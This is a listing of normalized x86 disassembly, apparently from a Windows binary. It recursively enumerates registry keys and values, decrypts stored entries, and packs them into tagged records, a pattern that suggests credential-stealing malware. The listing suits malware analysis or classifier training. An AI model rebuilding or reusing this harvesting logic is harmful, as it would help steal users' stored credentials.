mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x820 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x824 ] eax
cmp [ ebp - 0x81c ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
cmp [ ebp - 0x820 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x824 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40716c
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_401548
sub_40734e
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x17
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40716c
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40716c
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_407397
push ebp
mov ebp esp
add esp 0xfffff7ec
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x814 ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x810 ] eax
or eax eax
je r-xdata
jmp r-xdata
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumValueA
or eax eax
je r-xdata
push 0xbeef0000
push [ ebp - 0x814 ]
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_403ddc
sub_40744a
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x18
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_407397
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_407397
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_407397
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_407397
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_4074b8
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push eax
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0001
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0002
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_407519
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x19
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
push [ ebp + 0x8 ]
call sub_4074b8
push 0x23
push [ ebp + 0x8 ]
call sub_4074b8
push 0x1c
push [ ebp + 0x8 ]
call sub_4074b8
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40755b
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0xc
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push 0xbeef0000
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push 0xbeef0000
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push [ ebp - 0x4 ]
call sub_401835
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call sub_401dc9
mov [ ebp - 0x4 ] eax
sub_407618
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x1a
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push 0x1a
push [ ebp + 0x8 ]
call sub_40755b
push 0x0
push 0x23
push [ ebp + 0x8 ]
call sub_40755b
push 0x0
push 0x1c
push [ ebp + 0x8 ]
call sub_40755b
push rw-data
push 0x1a
push [ ebp + 0x8 ]
call sub_40755b
push rw-data
push 0x23
push [ ebp + 0x8 ]
call sub_40755b
push rw-data
push 0x1c
push [ ebp + 0x8 ]
call sub_40755b
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40768d
push ebp
mov ebp esp
add esp 0xfffff7e8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x818 ] eax
cmp [ ebp - 0x814 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0000
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_404116
push 0xbeef0001
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_404116
push [ ebp - 0x4 ]
call RegCloseKey
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40768d
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
push 0xbeef0000
push rw-data
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_404116
push 0xbeef0001
push rw-data
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_404116
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
sub_4077f8
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0001
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_407844
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x1b
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push 0x1a
push [ ebp + 0x8 ]
call sub_4077f8
push 0x23
push [ ebp + 0x8 ]
call sub_4077f8
push 0x1c
push [ ebp + 0x8 ]
call sub_4077f8
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40768d
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40768d
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push esi
call StrStrA
or eax eax
je r-xdata
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
inc eax
cmp [ eax ] 0x0
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0001
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push eax
push rw-data
call lstrlenA
pop edx
add eax edx
push eax
call sub_4023a8
push eax
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0001
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_40797f
push ebp
mov ebp esp
add esp 0xfffff7d0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x824 ] eax
lea eax [ ebp - 0x820 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
jmp r-xdata
or eax eax
je r-xdata
cmp [ ebp - 0x820 ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0x828 ] 0x15
push eax
call sub_401835
push [ eax ]
pop [ ebp - 0x828 ]
push eax
call sub_401835
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x824 ]
call sub_401835
push [ ebp - 0x82c ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40797f
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
lea eax [ ebp - 0x830 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x82c ] eax
cmp [ ebp - 0x81c ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0010
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_401548
cmp [ ebp - 0x82c ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4014e6
cmp [ ebp - 0x830 ] 0x4
jne r-xdata
mov eax [ ebp - 0x82c ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_4014e6
jmp r-xdata
sub_407be5
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x1c
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40797f
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40797f
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_407c2e
push ebp
mov ebp esp
add esp 0xfffffef4
push 0x0
push 0x1d
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x109 ]
push eax
call GetWindowsDirectoryA
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
cmp eax 0x104
ja r-xdata
push rw-data
lea eax [ ebp - 0x109 ]
push eax
call sub_401d75
push eax
push 0xbeef0000
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
sub_407c96
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x1e
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_407cd1
push ebp
mov ebp esp
add esp 0xfffff7d4
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
lea eax [ ebp - 0x820 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x824 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x828 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x82c ] eax
cmp [ ebp - 0x81c ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x824 ]
call sub_401835
push [ ebp - 0x828 ]
call sub_401835
push [ ebp - 0x82c ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407cd1
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0010
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x820 ]
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x82c ]
push [ ebp + 0x8 ]
call sub_401548
sub_407ee9
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x1f
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_407cd1
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_407cd1
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_407f32
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x20
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push esi
call StrStrIA
push eax
push rw-data
push edi
call StrStrIA
pop edx
or eax eax
jne r-xdata
push esi
call sub_4023a8
push rw-data
push eax
call sub_401dc9
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
or edx edx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_407fcc
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4010c2
mov ecx [ ebp + 0xc ]
or eax eax
je r-xdata
sub eax eax
cmp [ ecx ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call sub_40184c
push eax
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_40133e
pop edx
mov ecx [ ebp + 0xc ]
cmp [ ecx ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push edx
call sub_401835
sub eax eax
jmp r-xdata
mov eax edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x4 ]
pop [ eax ]
leave
retn 0xc
sub_408058
push ebp
mov ebp esp
add esp 0xffffffc0
push esi
push edi
push ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x10
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0x7
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x10
or eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0x7
cmp [ ebp + 0x14 ] 0x0
je r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x10
or eax eax
je r-xdata
sub ebx ebx
push [ ebp + 0xc ]
pop [ ebp - 0x40 ]
add [ ebp - 0x40 ] 0xb
push [ ebp - 0x40 ]
call sub_40184c
cld
mov [ ebp - 0x3c ] eax
mov edi [ ebp - 0x3c ]
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
[ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x40 ]
push [ ebp - 0x3c ]
call sub_402414
push [ ebp - 0x3c ]
call sub_401835
push [ ebp + 0xc ]
pop [ ebp - 0x40 ]
add [ ebp - 0x40 ] 0x1b
push [ ebp - 0x40 ]
call sub_40184c
mov [ ebp - 0x3c ] eax
cld
mov [ ebp - 0x3c ] eax
lea esi [ ebp - 0x10 ]
mov edi [ ebp - 0x3c ]
mov ecx 0x10
[ edi ] [ esi ]
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
[ edi ] [ esi ]
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x40 ]
push [ ebp - 0x3c ]
call sub_402414
push [ ebp - 0x3c ]
call sub_401835
cld
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x38 ]
mov ecx 0x10
[ edi ] [ esi ]
lea esi [ ebp - 0x20 ]
mov ecx 0x8
[ edi ] [ esi ]
push 0x1
lea eax [ ebp - 0x38 ]
push eax
call sub_41230b
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
shr edi 0x3
or edi edi
je r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
leave
retn 0x10
jmp r-xdata
or edi edi
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
push esi
call sub_4125b6
add esi 0x8
dec edi
movzx eax [ esi - 0x1 ]
cmp eax 0x8
ja r-xdata
sub esi [ ebp + 0x10 ]
shr esi 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push esi
push [ ebp + 0x10 ]
push 0x0
push 0x0
call WideCharToMultiByte
or eax eax
je r-xdata
sub esi eax
push eax
push eax
call sub_40184c
mov ebx eax
pop ecx
push 0x0
push 0x0
push ecx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x0
push 0x0
call WideCharToMultiByte
or eax eax
jne r-xdata
push ebx
call sub_401835
sub ebx ebx
sub_4081eb
push ebp
mov ebp esp
add esp 0xfffffff0
push edi
push ebx
sub ebx ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401364
push eax
push [ ebp + 0x8 ]
call sub_40149f
mov edi eax
pop eax
add edi eax
or eax eax
je r-xdata
push 0x0
push edi
push [ ebp + 0x8 ]
call sub_401047
mov eax ebx
pop ebx
pop edi
leave
retn 0x8
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407fcc
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407fcc
mov [ ebp - 0x8 ] eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_408058
mov ebx eax
push [ ebp - 0x4 ]
call sub_401835
push [ ebp - 0x8 ]
call sub_401835
sub_40826c
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x6
jb r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4081eb
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40803a
cmp [ ebp + 0xc ] 0x3
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_401364
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40803a
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40803a
push [ ebp + 0x10 ]
push 0x18
push [ ebp + 0x8 ]
call sub_4013e8
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_401364
leave
retn 0x10
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40803a
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40803a
sub_4082e9
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_4013e8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4081eb
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4081eb
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4081eb
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
leave
retn 0x14
sub_40832d
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x8 ]
call sub_4013e8
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401364
mov esi eax
jmp r-xdata
or esi esi
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
leave
retn 0x10
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40826c
mov edi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
push rw-data
push [ ebp - 0x4 ]
call StrStrIA
or eax eax
jne r-xdata
jmp r-xdata
push 0xbeef0001
push [ ebp + 0xc ]
call sub_4014e6
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
call sub_401548
mov [ ebp - 0x14 ] eax
jmp r-xdata
push rw-data
push [ ebp - 0x4 ]
call StrStrIA
or edi edi
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_4082e9
cmp [ ebp - 0x14 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x4 ]
call sub_401835
dec esi
push 0x0
push [ ebp + 0xc ]
call sub_4014e6
push 0x0
push [ ebp + 0xc ]
call sub_4014e6
push 0x0
push [ ebp + 0xc ]
call sub_4014e6
push [ ebp - 0x8 ]
call sub_401835
push [ ebp - 0xc ]
call sub_401835
push [ ebp - 0x10 ]
call sub_401835
dec edi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_401548
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call sub_401548
push [ ebp - 0x10 ]
push [ ebp + 0xc ]
call sub_401548
cmp [ ebp - 0x10 ] 0x0
je r-xdata
sub_40849d
push ebp
mov ebp esp
add esp 0xffffffe4
push esi
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x10
jae r-xdata
push [ ebp + 0x8 ]
call sub_4012bb
mov [ ebp - 0x8 ] 0x1
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x1
pop esi
leave
retn 0x8
mov eax 0x1
pop esi
leave
retn 0x8
cmp [ ebp - 0x4 ] 0x2
jb r-xdata
cmp [ ebp - 0x4 ] 0x6
jbe r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x1
pop esi
leave
retn 0x8
or eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x5
jb r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_4013e8
lea eax [ ebp - 0x8 ]
push eax
push 0x18
push [ ebp + 0x8 ]
call sub_4013e8
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0x1c ] eax
jmp r-xdata
